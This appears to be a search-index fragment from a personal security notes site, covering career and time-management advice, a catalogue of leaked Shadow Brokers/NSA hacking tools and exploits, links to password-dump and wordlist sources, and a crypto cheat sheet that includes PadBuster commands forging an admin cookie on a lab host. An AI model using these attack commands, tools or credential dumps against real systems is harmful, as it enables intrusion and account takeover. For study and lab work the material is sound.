cyber attacks...) Have dream job requirements. Your list of things required from an employer. and rank those. Management style / Leave policy Budget and determine what is the enough salary Top 10 companies that you need to work in Hunt types: Top 10 Discovery Internal: Within current company Document as you go Creating resume while hunting Extract things from job listings, etc. into resume Resume Catch-all Tailored Take 10 minutes of time from an manager and get more info about company structure / values, etc. Look at who is working in company Pivot and escalate to different ppl. Look for internal advocates. Network with community Find mentors Lean how they got to where they got to. Ask questions about them without trying to shine at first. Hook - ... [complete this from slides] ... The Dip (book) Technical Recall Within 24 hours review material again for 30 mins (to increase retention to 100% again) 48 hours later, review again for 25 minutes (back to 100%) Each subsequent review takes less time and increase the retention A longer review interval leads to stronger recall skills Review intervals need to be short enough to recall concepts with minimal review time Anki - Free flash card app (spaced repetition training) Can judge and rate yourself. Questions that are hard will be displayed more. When creating card, change Basic type to Closed type. Tools Managed Node Types Fields . Add new field called Visual . ???? (webinar disconnected) Motivation: Enjoyment: finding enjoyment in your topic to motivate. Methods: a method (spaced repetition/anki) gives you a task and a clear completion target. System: Habit development is necessary. Patience: Frustration is a normal and valuable part of learning. Problem of Time: Revisit goals and see if it's worth investing time. Changes that can be made to life. https://sansurl.com/504-lab-ankicards pptxindex.py Time Management Time Traps Multitasking Attention is also divided Doubles time taken / mistakes Example: Round1: Write A-Z and 1-20. Round2: Do the same, but write one letter and then write one number (zigzag). Forces brain to context switch (human brain is not wired for this) Choose single key task for the day (organize time around it). Ksy task is the priority. Techno Time Traps (Ex: Social Media) Procrastination Delay in taking action until last minute Due to: Distractions Unpleasant Tasks Low self-esteem and lack of confidence Setting goals/deadlines in distant future Perfectionism Overcome: Set goals and deadlines Break into smaller tasks Check off smaller tasks (confidence boost) If not-confident: Visualize future you want Write costs of continued inaction and its impact to life Workspace Interruptions Politely say 'no' Use 'Do not disturb' message Take control of conversation and end smoothly Disorganization Setup schedules Setup reminders Stick to schedules Lack of Planing and Prioritization Plan and set daily goals Prioritize important tasks Group similar tasks together and handle together Achieving Work Life Balance Identify your peak time by analyzing energy through day Schedule important, complex tasks at peek time Warren Buffett's Productivity Secret Say 'no' to not important things Two list system Write 25 tasks you want to get done in the day Circle 5 most important Rule out other 20 items Parkinson's Law of Productivity 'Work expands to fill the time available for its completion' If 5 days is given to a 2 day task, task will grown into 5 days. Example: fine-tuning. Steps: Identify tasks do be done. Assign right amount of time for tasks. Set realistic deadlines Focus on getting task done within deadline Understand when you are done Time Theming Give each day a theme. Have focus on it and return to it when distracted. Easy to prioritize and focus. Similar tasks get grouped. Pareto's 80/20 Rule 80% of your output comes from 20% of your effort Remaining 20% of your output comes from 80% of your effort Identify 20% of high payoff tasks - This will generate 80% of results Eat a Live Frog for Breakfast (eat the largest frog first) That is probably the worst thing that is going to happen for the day. Hence rest of the day feels better. Live frog: Biggest most important task of the list Task you'd most likely to procrastinate Task most likely to add more value to career Stephen Covey's Time Management Matrix Urgent task: Requires immediate attention Important task: Has to be done, but not immediately. Q1: Quadrant of necessities Crisis situations Urgent problems Emergencies Deadline driven problems Q2: Activities related to long term strategizing - Very important since this is about long term growth Relationship building Personal Development Capitalizing on new opportunities Health Education Exercise Career Growth Q3: (Eliminate) Interruptions Unnecessary meetings Q4: Traditional time wasting tasks (calls / emails) Habitual tasks Delegation Help others grow Decrease your workload When to delegate? Can someone else do the task? Task on which long term success depends, need your attention. Does task provide opportunity to grown and develop another person. Is this a recurring task? Can I train someone? Do you have enough time to delegate the task effectively? Training Q A Opportunity to check on progress Rework if necessary Effective Delegation Set expectations Communicate expectations Schedules/timelines Frequency and format of updates Ask the person to confirm understanding Ensure accountability Avoid reverse delegation Why? Task not through through Unclear communication Inadequate coaching What to do? Never accept back tasks Coach the employee instead Employee should be able to handle similar tasks in future Creating a Schedule Daily / Weekly Schedules Create a todo list Allocate a time needed to complete Work out the order and assign start-time Add cushion time to task or daily schedule Habits for Time Management Power of positive affirmations Programming your subconscious mind using positive self-talk Repeating send positive affirmations from conscious mind to subconscious mind Affirmations become the new operation instructions of subconscious mind Ex: \"I manage my time effectively to achieve work life balance and improve quality of my life\" Positive Psychology Thoughts + Beliefs = Reality Power of positive visualization Creating mental images in mind Mental images influence subconscious mind You will become the person you visualize in mind How? Choose a quite and secluded spot Choose the present moment (do not say \"I will become\") 10 Habits Habit 1 \u2013 Work Smarter Not Harder Give careful thought Can it be done efficiently Can other tasks be grouped Can it/part be delegated Can the task be eliminated Habit 2 \u2013 Cultivate Discipline and Focus Chalk out clear priorities Focus on the priorities (stick to) Select most valuable and important task Shut out all distractions Habit 3 \u2013 Develop the Habit of Punctuality Aim to finish before time Before time all the time Habit 4 \u2013 Take Frequent Breaks Take time for self-renewal Physical Social/emotional Mental Spiritual Habit 5 \u2013 Use Spare Minutes for Filler Tasks Have list of filler tasks ready Habit 6 \u2013 Learn to Say \u2018No\u2019 Habit 7 \u2013 Start Your Day Early Habit 8 \u2013 Sleep 7 to 8 Hours a Day Habit 9 \u2013 Have a Cut-off Time for Tasks Intercept meetings Cut off a task your are working on Reschedule and unfinished meeting or task to another time Habit 10 \u2013 Keep Track of Your Time Have a clock on a visible place","title":"Career"},{"location":"career/#references","text":"We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/","title":"References"},{"location":"career/#quotes","text":"The real pros ask the real questions : 1 ) If 2 ) When 3 ) Why 4 ) What 5 ) How much have you got 6 ) Have you got it 7 ) Do you get it 8 ) If so , how often 9 ) Which do you choose , a hard or soft option 10 ) How much do you need ?","title":"Quotes"},{"location":"career/#c-level","text":"Position security as sales enablement Security needed to reduce sales cycle (align with business requirements) Evaluate security risks in context of business risk (holistic) Process vs problem","title":"C-Level"},{"location":"career/#jobs-hunting","text":"https://www.linkedin.com/posts/jasonsblanchard_job-hunting-slides-from-webcast-521-activity-6669260088525508608-zvRe Identify the code that you do and build an elevated statement about you. Example: https://www.linkedin.com/in/jasonsblanchard/ Think about what people pay you to do. (I break things to improve them... I protect companies from cyber attacks...) Have dream job requirements. Your list of things required from an employer. and rank those. Management style / Leave policy Budget and determine what is the enough salary Top 10 companies that you need to work in Hunt types: Top 10 Discovery Internal: Within current company Document as you go Creating resume while hunting Extract things from job listings, etc. into resume Resume Catch-all Tailored Take 10 minutes of time from an manager and get more info about company structure / values, etc. Look at who is working in company Pivot and escalate to different ppl. Look for internal advocates. Network with community Find mentors Lean how they got to where they got to. Ask questions about them without trying to shine at first. Hook - ... [complete this from slides] ... The Dip (book)","title":"Jobs Hunting"},{"location":"career/#technical-recall","text":"Within 24 hours review material again for 30 mins (to increase retention to 100% again) 48 hours later, review again for 25 minutes (back to 100%) Each subsequent review takes less time and increase the retention A longer review interval leads to stronger recall skills Review intervals need to be short enough to recall concepts with minimal review time Anki - Free flash card app (spaced repetition training) Can judge and rate yourself. Questions that are hard will be displayed more. When creating card, change Basic type to Closed type. Tools Managed Node Types Fields . Add new field called Visual . ???? (webinar disconnected) Motivation: Enjoyment: finding enjoyment in your topic to motivate. Methods: a method (spaced repetition/anki) gives you a task and a clear completion target. System: Habit development is necessary. Patience: Frustration is a normal and valuable part of learning. Problem of Time: Revisit goals and see if it's worth investing time. Changes that can be made to life. https://sansurl.com/504-lab-ankicards pptxindex.py","title":"Technical Recall"},{"location":"career/#time-management","text":"Time Traps Multitasking Attention is also divided Doubles time taken / mistakes Example: Round1: Write A-Z and 1-20. Round2: Do the same, but write one letter and then write one number (zigzag). Forces brain to context switch (human brain is not wired for this) Choose single key task for the day (organize time around it). Ksy task is the priority. Techno Time Traps (Ex: Social Media) Procrastination Delay in taking action until last minute Due to: Distractions Unpleasant Tasks Low self-esteem and lack of confidence Setting goals/deadlines in distant future Perfectionism Overcome: Set goals and deadlines Break into smaller tasks Check off smaller tasks (confidence boost) If not-confident: Visualize future you want Write costs of continued inaction and its impact to life Workspace Interruptions Politely say 'no' Use 'Do not disturb' message Take control of conversation and end smoothly Disorganization Setup schedules Setup reminders Stick to schedules Lack of Planing and Prioritization Plan and set daily goals Prioritize important tasks Group similar tasks together and handle together Achieving Work Life Balance Identify your peak time by analyzing energy through day Schedule important, complex tasks at peek time Warren Buffett's Productivity Secret Say 'no' to not important things Two list system Write 25 tasks you want to get done in the day Circle 5 most important Rule out other 20 items Parkinson's Law of Productivity 'Work expands to fill the time available for its completion' If 5 days is given to a 2 day task, task will grown into 5 days. Example: fine-tuning. Steps: Identify tasks do be done. Assign right amount of time for tasks. Set realistic deadlines Focus on getting task done within deadline Understand when you are done Time Theming Give each day a theme. Have focus on it and return to it when distracted. Easy to prioritize and focus. Similar tasks get grouped. Pareto's 80/20 Rule 80% of your output comes from 20% of your effort Remaining 20% of your output comes from 80% of your effort Identify 20% of high payoff tasks - This will generate 80% of results Eat a Live Frog for Breakfast (eat the largest frog first) That is probably the worst thing that is going to happen for the day. Hence rest of the day feels better. Live frog: Biggest most important task of the list Task you'd most likely to procrastinate Task most likely to add more value to career Stephen Covey's Time Management Matrix Urgent task: Requires immediate attention Important task: Has to be done, but not immediately. Q1: Quadrant of necessities Crisis situations Urgent problems Emergencies Deadline driven problems Q2: Activities related to long term strategizing - Very important since this is about long term growth Relationship building Personal Development Capitalizing on new opportunities Health Education Exercise Career Growth Q3: (Eliminate) Interruptions Unnecessary meetings Q4: Traditional time wasting tasks (calls / emails) Habitual tasks Delegation Help others grow Decrease your workload When to delegate? Can someone else do the task? Task on which long term success depends, need your attention. Does task provide opportunity to grown and develop another person. Is this a recurring task? Can I train someone? Do you have enough time to delegate the task effectively? Training Q A Opportunity to check on progress Rework if necessary Effective Delegation Set expectations Communicate expectations Schedules/timelines Frequency and format of updates Ask the person to confirm understanding Ensure accountability Avoid reverse delegation Why? Task not through through Unclear communication Inadequate coaching What to do? Never accept back tasks Coach the employee instead Employee should be able to handle similar tasks in future Creating a Schedule Daily / Weekly Schedules Create a todo list Allocate a time needed to complete Work out the order and assign start-time Add cushion time to task or daily schedule Habits for Time Management Power of positive affirmations Programming your subconscious mind using positive self-talk Repeating send positive affirmations from conscious mind to subconscious mind Affirmations become the new operation instructions of subconscious mind Ex: \"I manage my time effectively to achieve work life balance and improve quality of my life\" Positive Psychology Thoughts + Beliefs = Reality Power of positive visualization Creating mental images in mind Mental images influence subconscious mind You will become the person you visualize in mind How? Choose a quite and secluded spot Choose the present moment (do not say \"I will become\") 10 Habits Habit 1 \u2013 Work Smarter Not Harder Give careful thought Can it be done efficiently Can other tasks be grouped Can it/part be delegated Can the task be eliminated Habit 2 \u2013 Cultivate Discipline and Focus Chalk out clear priorities Focus on the priorities (stick to) Select most valuable and important task Shut out all distractions Habit 3 \u2013 Develop the Habit of Punctuality Aim to finish before time Before time all the time Habit 4 \u2013 Take Frequent Breaks Take time for self-renewal Physical Social/emotional Mental Spiritual Habit 5 \u2013 Use Spare Minutes for Filler Tasks Have list of filler tasks ready Habit 6 \u2013 Learn to Say \u2018No\u2019 Habit 7 \u2013 Start Your Day Early Habit 8 \u2013 Sleep 7 to 8 Hours a Day Habit 9 \u2013 Have a Cut-off Time for Tasks Intercept meetings Cut off a task your are working on Reschedule and unfinished meeting or task to another time Habit 10 \u2013 Keep Track of Your Time Have a clock on a visible place","title":"Time Management"},{"location":"collections/","text":"Binaries Nmap: - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ Leaked Datasets Disclaimer: These links are intended to be used by information security researchers who are interested in understanding the capabilities of frameworks/data-sets used in real-life. I am not responsible if you choose to use my work or this documentation to do something dumb and/or illegal. Shadowbroker https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup - https://danderspritz.com/ DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes. Password Dumps http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/ Mirai https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials Tomcat https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt Word-lists https://labs.nettitude.com/tools/rocktastic/ Parameters https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt ftp : // ftp . openwall . com / pub / wordlists / http : // www . openwall . com / mirrors / https : // github . com / danielmiessler / SecLists http : // www . outpost9 . com / files / WordLists . html http : // www . vulnerabilityassessment . co . uk / passwords . htm http : // packetstormsecurity . org / Crackers / wordlists / http : // www . ai . uga . edu / ftplib / natural - language / moby / http : // wordlist . sourceforge . net / https : // github . com / berzerk0 / Probable - Wordlists https : // weakpass . com / wordlist https : // pypi . org / project / wordlist / https : // packages . debian . org / jessie / wordlist References Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"Collections"},{"location":"collections/#binaries","text":"Nmap: - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/","title":"Binaries"},{"location":"collections/#leaked-datasets","text":"Disclaimer: These links are intended to be used by information security researchers who are interested in understanding the capabilities of frameworks/data-sets used in real-life. I am not responsible if you choose to use my work or this documentation to do something dumb and/or illegal.","title":"Leaked Datasets"},{"location":"collections/#shadowbroker","text":"https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup - https://danderspritz.com/ DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes.","title":"Shadowbroker"},{"location":"collections/#password-dumps","text":"http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/ Mirai https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials Tomcat https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt","title":"Password Dumps"},{"location":"collections/#word-lists","text":"https://labs.nettitude.com/tools/rocktastic/ Parameters https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt ftp : // ftp . openwall . com / pub / wordlists / http : // www . openwall . com / mirrors / https : // github . com / danielmiessler / SecLists http : // www . outpost9 . com / files / WordLists . html http : // www . vulnerabilityassessment . co . uk / passwords . htm http : // packetstormsecurity . org / Crackers / wordlists / http : // www . ai . uga . edu / ftplib / natural - language / moby / http : // wordlist . sourceforge . net / https : // github . com / berzerk0 / Probable - Wordlists https : // weakpass . com / wordlist https : // pypi . org / project / wordlist / https : // packages . debian . org / jessie / wordlist","title":"Word-lists"},{"location":"collections/#references","text":"Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"References"},{"location":"crypto/","text":"Tools Compare unknown cipher against ACA cipher types: http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html Crypto Operations: http://rumkin.com/tools/cipher/ RsaCtfTool: https://github.com/Ganapati/RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt One time pad decipher: https://www.braingle.com/brainteasers/codes/onetimepad.php#form Ceasar Cipher: https://www.xarg.org/tools/caesar-cipher/ Ceaser Decode: echo string | tr [A-Za-z] [N-ZA-Mn-za-m] Vigenere Cipher: https://www.dcode.fr/vigenere-cipher Elliptic Curve Cryptography for Python: https://pypi.org/project/seccure/ SSL Config Generator: https://ssl-config.mozilla.org/ PadBuster Padding Oracle Attack https://github.com/GDSSecurity/PadBuster https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt: padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user = admin OpenSSL General Create key pair: openssl genrsa - out keypair . pem 2048 Extracting public key from rsa context: openssl rsa - in keypair . pem - pubout - out publickey . crt Convert public key to PKCS#8: openssl pkcs8 - topk8 - inform PEM - outform PEM - nocrypt - in keypair . pem - out pkcs8 . key Retrieve exponent and modulus values: openssl rsa - pubin - in publickey . crt - text - noout Extracting Public Key - Using private key: openssl pkey - in example . key - pubout Extracting Public Key - From certificate: openssl x509 - in example . crt - pubkey - noout CSR and Signing Create CSR and private key openssl req -new -newkey rsa:2048 -nodes -keyout example.key -out example.csr #OR openssl genrsa -out example.key 2048 openssl req -new -key example.key -out example.csr Check CSR openssl req -verify -in example.csr -text -noout Sign CSR enforcing SHA256 openssl x509 -req -days 360 -in example.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out example.crt -sha256 Self-sign openssl x509 -req -days 365 -in example.csr -signkey example.key -out example.crt CA-sign openssl x509 -req -in example.csr -CA ca.crt -CAkey ca.key -set_serial 9999 -extensions client -days 9999 -outform PEM -out example.crt Create P12 openssl pkcs12 -export -clcerts -in server.crt -inkey server.key -out cert.p12 Encoding/Decoding IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII: echo 010000 | perl -lpe $_=pack B* ,$_ Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook Base64 Decode: base64 -d NmQy echo NmQy | base64 -d Base64 Encode: base64 NmQy echo NmQy | base64 Hashes https://hashkiller.co.uk Concurrency Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi References How to create a self-signed SSL Certificate How to Set Up Mutual TLS Authentication to 